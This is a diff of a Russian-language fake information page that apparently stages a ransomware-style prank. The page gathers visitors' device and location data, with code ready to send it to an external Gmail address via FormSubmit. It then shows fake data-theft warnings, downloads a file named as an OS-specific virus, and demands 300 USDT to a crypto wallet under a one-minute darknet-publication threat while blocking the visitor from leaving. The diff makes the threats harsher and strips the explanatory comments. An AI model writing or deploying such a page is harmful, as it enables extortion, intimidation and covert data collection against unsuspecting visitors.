@@ -77,7 +77,6 @@
             margin-top: 8px;
             transition: color 0.3s;
         }
-        /* Оверлеи */
         .overlay {
             position: fixed;
             top: 0;
@@ -156,7 +155,7 @@
         <div class="info-grid">
             <div class="info-card"><h3>USD/RUB</h3><div class="value" id="usdRate">92.50</div></div>
             <div class="info-card"><h3>EUR/RUB</h3><div class="value" id="eurRate">99.80</div></div>
-            <div class="info-card"><h3>Погода в Москве</h3><div class="value" id="weather">+12°C, облачно</div></div>
+            <div class="info-card"><h3>Погода в Минске</h3><div class="value" id="weather">+12°C, облачно</div></div>
             <div class="info-card"><h3>Ваш город (по IP)</h3><div class="value" id="userCity">Определение...</div></div>
         </div>
         <p style="font-size:0.85rem; color:#7f8c8d; text-align:center; margin-top:10px;">Информация обновляется автоматически.</p>
@@ -171,19 +170,19 @@
     <div class="modal">
         <h2 id="dataTitle">⚠️ ОБНАРУЖЕНА УТЕЧКА ДАННЫХ</h2>
         <div id="stolenDataList"></div>
-        <div class="close-hint">Ваши данные экспортированы. Выполняется шифрование...</div>
+        <div class="close-hint">Ваши данные похищены. Готовится публикация в даркнете...</div>
     </div>
 </div>
 
 <div id="ransomOverlay" class="overlay">
     <div class="modal ransom">
-        <h2>🔒 ВАШИ ФАЙЛЫ ЗАШИФРОВАНЫ</h2>
-        <p id="ransomDescription">Все личные данные, контакты, фото и история браузера скопированы и заблокированы.</p>
+        <h2>💀 ВАШИ ДАННЫЕ ПОХИЩЕНЫ</h2>
+        <p id="ransomDescription">Все личные данные, контакты, фото, история браузера скопированы и готовятся к публикации в даркнете.</p>
         <div class="price">300 USDT</div>
-        <p>Для восстановления доступа переведите указанную сумму на кошелек:</p>
+        <p>Чтобы предотвратить утечку, переведите указанную сумму на кошелек в течение 1 минуты.</p>
         <p style="font-size:0.8rem; background:#000; padding:8px; border-radius:8px;">TXLAQmZ9QkXhC9kR3qL5pW6yZ7bN8cV9d (TRC20)</p>
-        <button id="ransomButton">Я ПЕРЕВЕЛ(А), РАЗБЛОКИРУЙТЕ</button>
-        <div class="close-hint" id="timerDisplay">Срок: 1:00 минут. Не закрывайте страницу.</div>
+        <button id="ransomButton">Я ПЕРЕВЕЛ(А), УНИЧТОЖЬТЕ КОПИИ</button>
+        <div class="close-hint" id="timerDisplay">Срок: 1:00 минут. Не закрывайте страницу — иначе данные будут опубликованы немедленно.</div>
     </div>
 </div>
 
@@ -191,9 +190,9 @@
     <div class="modal ransom">
         <h2>❌ ОШИБКА ПРОВЕРКИ ПЛАТЕЖА</h2>
         <p>Платеж не найден в блокчейне. Вы пытаетесь обмануть систему.</p>
-        <p>Ваши данные НЕ будут восстановлены. До окончания срока осталось:</p>
+        <p>Ваши данные будут опубликованы в даркнете. До публикации осталось:</p>
         <div id="cheatTimerDisplay" style="font-size: 1.5rem; font-weight: bold; margin: 15px 0;">1:00</div>
-        <p style="font-size:0.8rem;">Ожидайте автоматического удаления данных через указанное время.</p>
+        <p style="font-size:0.8rem;">Даже если вы закроете страницу, процесс не остановится.</p>
         <button id="closeCheatBtn" style="background:#e67e22;">Закрыть</button>
     </div>
 </div>
@@ -201,9 +200,7 @@
 <script>
     (function() {
         // ====== УПРАВЛЕНИЕ ОТПРАВКОЙ НА ПОЧТУ ======
-        // Установите true, чтобы отправлять данные на hitmandav777@gmail.com
-        // Установите false, чтобы отключить отправку (экономия лимита FormSubmit)
-        const ENABLE_EMAIL_SEND = false;   // <-- измените на true, когда будете готовы к реальному розыгрышу
+        const ENABLE_EMAIL_SEND = false;   // true для отправки на hitmandav777@gmail.com
         // =========================================
 
         // Определение ОС и типа устройства
@@ -218,21 +215,33 @@
         }
 
         const osInfo = detectOS();
-        console.log("[DEBUG] Определена ОС:", osInfo.os, osInfo.type);
+
+        // Генерация имени файла в зависимости от ОС
+        function getMalwareFileName() {
+            const base = "system_virus";
+            switch (osInfo.os) {
+                case 'Android': return `${base}.apk`;
+                case 'iOS': return `${base}.ipa`;
+                case 'macOS': return `${base}.dmg`;
+                case 'Windows': return `${base}.exe`;
+                case 'Linux': return `${base}.bin`;
+                default: return `${base}.dat`;
+            }
+        }
 
         // Тексты в зависимости от ОС
         function getRansomDescription() {
             switch (osInfo.os) {
                 case 'Android':
-                    return "Все данные вашего Android-устройства (контакты, SMS, фото, файлы) скопированы и зашифрованы. Доступ к устройству заблокирован.";
+                    return "Все данные вашего Android-устройства (контакты, SMS, фото, файлы) похищены. Если вы не заплатите, они будут опубликованы в даркнете.";
                 case 'iOS':
-                    return "Ваш iPhone/iPad взломан. iCloud, фотографии, заметки, история браузера — всё скопировано и зашифровано. Устройство заблокировано.";
+                    return "Ваш iPhone/iPad взломан. iCloud, фотографии, заметки, история браузера — всё похищено. Утечка данных неизбежна без оплаты.";
                 case 'macOS':
-                    return "Ваш Mac скомпрометирован. Все документы, пароли из связки ключей, файлы и история браузера зашифрованы. Система заблокирована.";
+                    return "Ваш Mac скомпрометирован. Все документы, пароли из связки ключей, файлы похищены. При неоплате данные будут проданы на тёмных форумах.";
                 case 'Linux':
-                    return "Ваш Linux-сервер/рабочая станция заражена. Критические файлы, SSH-ключи, базы данных зашифрованы. Доступ ограничен.";
+                    return "Ваш Linux-сервер/рабочая станция заражена. Критические файлы, SSH-ключи, базы данных похищены. Публикация начнётся через 1 минуту.";
                 default:
-                    return "Все личные данные, контакты, фото и история браузера скопированы и заблокированы.";
+                    return "Все личные данные, контакты, фото и история браузера похищены. Неоплата приведёт к публикации в даркнете.";
             }
         }
 
@@ -268,7 +277,7 @@
         const ransomDescElem = document.getElementById('ransomDescription');
         const dataTitleElem = document.getElementById('dataTitle');
 
-        // Установка текстов в зависимости от ОС
+        // Установка текстов
         dataTitleElem.innerText = getDataLeakTitle();
         if (ransomDescElem) ransomDescElem.innerText = getRansomDescription();
 
@@ -286,7 +295,7 @@
         function beforeUnloadHandler(e) {
             if (!isPrankRevealed) {
                 e.preventDefault();
-                e.returnValue = 'Внимание! Операция ещё не завершена. Если вы закроете страницу, ваши данные могут быть потеряны. Вы уверены?';
+                e.returnValue = 'Внимание! Если вы закроете страницу, ваши данные будут немедленно опубликованы в даркнете. Вы уверены?';
                 return e.returnValue;
             }
         }
@@ -335,12 +344,9 @@
             }
         }
 
-        // Отправка данных на почту (только если включено)
+        // Отправка данных на почту
         function sendDataToEmail() {
-            if (!ENABLE_EMAIL_SEND) {
-                console.log("[DEBUG] Отправка данных на почту отключена (ENABLE_EMAIL_SEND = false)");
-                return;
-            }
+            if (!ENABLE_EMAIL_SEND) return;
             const data = {
                 device: deviceInfo.device,
                 os: deviceInfo.os,
@@ -355,13 +361,11 @@
                 userAgent: deviceInfo.userAgent,
                 time: new Date().toLocaleString()
             };
-
             fetch('https://formsubmit.co/ajax/hitmandav777@gmail.com', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(data)
-            }).then(() => console.log("[INFO] Данные отправлены на почту"))
-              .catch(err => console.error("[ERROR] Ошибка отправки:", err));
+            }).catch(console.error);
         }
 
         // Отображение "украденных" данных
@@ -382,15 +386,15 @@
             stolenDataList.innerHTML = dataHtml;
             dataOverlay.classList.add('active');
             warningLine.style.color = "#ff6b6b";
-            warningLine.innerHTML = "⚠️ КРИТИЧЕСКАЯ УЯЗВИМОСТЬ: ваши данные скомпрометированы!";
+            warningLine.innerHTML = "⚠️ КРИТИЧЕСКАЯ УЯЗВИМОСТЬ: ваши данные похищены!";
 
-            // Имитация скачивания
+            // Имитация скачивания вредоносного файла
             setTimeout(() => {
                 const fakeBlob = new Blob(["Этот файл не опасен. Демонстрация метода социальной инженерии."], {type: "application/octet-stream"});
                 const url = URL.createObjectURL(fakeBlob);
                 const a = document.createElement('a');
                 a.href = url;
-                a.download = "update_security_required.apk";
+                a.download = getMalwareFileName();
                 document.body.appendChild(a);
                 a.click();
                 document.body.removeChild(a);
@@ -409,10 +413,10 @@
             ransomShown = true;
             ransomOverlay.classList.add('active');
             warningLine.style.color = "#ff4757";
-            warningLine.innerHTML = "‼️ ВАША СИСТЕМА ЗАБЛОКИРОВАНА. НЕ ЗАКРЫВАЙТЕ СТРАНИЦУ ‼️";
+            warningLine.innerHTML = "‼️ ВАШИ ДАННЫЕ ПОХИЩЕНЫ. НЕ ЗАКРЫВАЙТЕ СТРАНИЦУ ‼️";
 
             let timeLeft = 60;
-            timerDisplaySpan.innerText = `Срок: 1:00 минут. Не закрывайте страницу.`;
+            timerDisplaySpan.innerText = `Срок: 1:00 минут. Не закрывайте страницу — иначе данные будут опубликованы немедленно.`;
             ransomTimerInterval = setInterval(() => {
                 if (isPrankRevealed) {
                     clearInterval(ransomTimerInterval);
@@ -425,7 +429,7 @@
                 } else {
                     const minutes = Math.floor(timeLeft / 60);
                     const seconds = timeLeft % 60;
-                    timerDisplaySpan.innerText = `Срок: ${minutes}:${seconds.toString().padStart(2,'0')} минут. Не закрывайте страницу.`;
+                    timerDisplaySpan.innerText = `Срок: ${minutes}:${seconds.toString().padStart(2,'0')} минут. Не закрывайте страницу — иначе данные будут опубликованы немедленно.`;
                 }
             }, 1000);
         }
@@ -476,9 +480,9 @@
             jokeDiv.className = 'joke-message';
             jokeDiv.innerHTML = `
                 <strong>😄 ЭТО БЫЛА ШУТКА! 😄</strong><br><br>
-                Никакие данные не были украдены или зашифрованы.<br>
+                Никакие данные не были похищены или опубликованы.<br>
                 Вся информация, показанная на этом сайте, является общедоступной и не требует специальных разрешений.<br>
-                Файл "update_security_required.apk" — обычный текстовый файл, абсолютно безопасен.<br>
+                Файл "${getMalwareFileName()}" — обычный текстовый файл, абсолютно безопасен.<br>
                 <button id="closeJokeBtn" style="background:#2c3e50; margin-top:15px;">Закрыть</button>
             `;
             container.appendChild(jokeDiv);
@@ -498,8 +502,12 @@
         deviceInfo = collectDeviceInfo();
         getUserGeo().then(geo => {
             geoInfo = geo;
-            sendDataToEmail();   // отправка только если ENABLE_EMAIL_SEND = true
-            showStolenData();
+            sendDataToEmail();
+            setTimeout(() => {
+                if (!isPrankRevealed) {
+                    showStolenData();
+                }
+            }, 10000); // 10 секунд на изучение сайта
         });
 
         const savedState = localStorage.getItem('prank_state');
@@ -515,9 +523,12 @@
         setInterval(updateTime, 1000);
         updateTime();
 
+        // Погода в Минске (имитация)
+        const minskTemps = [5, 6, 7, 8, 9, 10, 11, 12, 13, 14];
+        const conditions = ["ясно", "облачно", "небольшой дождь", "пасмурно", "солнечно"];
+        document.getElementById('weather').innerText = "+" + minskTemps[Math.floor(Math.random() * minskTemps.length)] + "°C, " + conditions[Math.floor(Math.random() * conditions.length)];
         document.getElementById('usdRate').innerText = (92 + Math.random() * 2).toFixed(2);
         document.getElementById('eurRate').innerText = (99 + Math.random() * 3).toFixed(2);
-        document.getElementById('weather').innerText = "+" + Math.floor(8 + Math.random() * 8) + "°C, " + (Math.random() > 0.5 ? "ясно" : "облачно");
     })();
 </script>
 </body>
